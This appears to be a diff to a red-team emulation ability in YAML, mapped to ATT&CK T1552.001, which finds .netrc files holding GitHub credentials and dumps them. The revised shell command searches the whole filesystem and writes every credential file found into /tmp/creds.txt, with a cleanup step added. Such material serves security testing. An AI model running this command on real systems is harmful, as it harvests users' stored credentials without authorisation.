@@ -1,7 +1,7 @@
 - id: da4f751a-020b-40d7-b9ff-d433b7799803
   name: Find and Access Github Credentials
-  description: This test looks for .netrc files (which stores github credentials in
-    clear text )and dumps its contents if found.
+  description: Find .netrc files, which store GitHub credentials in clear text, and
+    dump their contents if found.
   tactic: credential-access
   technique:
     attack_id: T1552.001
@@ -9,25 +9,34 @@
   platforms:
     darwin:
       sh:
-        command: for file in $(find /home -type f -name .netrc 2> /dev/null);do echo
-          $file ; cat $file ; done
-        elevation_required: false
+        command: find / -name '.netrc' -type f -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt;
+          cat "$1" >> /tmp/creds.txt' _ {} \; 2>/dev/null
+        cleanup: rm -f /tmp/creds.txt
   plugin: atomic
   singleton: false
   repeatable: true
   delete_payload: false
   privilege: ''
   buckets:
-  - credential-access
   - atomic-red-team
   - t1552.001
+  - credential-access
   author: Atomic Red Team
   additional_info:
     input_arguments:
       file_path:
         description: Path to search
         type: string
-        default: /home
+        default: /
+      filename:
+        description: Credential file to search for
+        type: string
+        default: .netrc
+      optional_flags:
+        description: optional flags passed into find that should be ran
+        type: string
+        default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+          _ {} \;
     technique_created: '2020-02-04T12:52:13.006Z'
     atomic_guid: da4f751a-020b-40d7-b9ff-d433b7799803
-    import_timestamp: '2026-09-04T06:55:55.831463Z'
+    import_timestamp: '2026-09-05T06:40:49.876585Z'
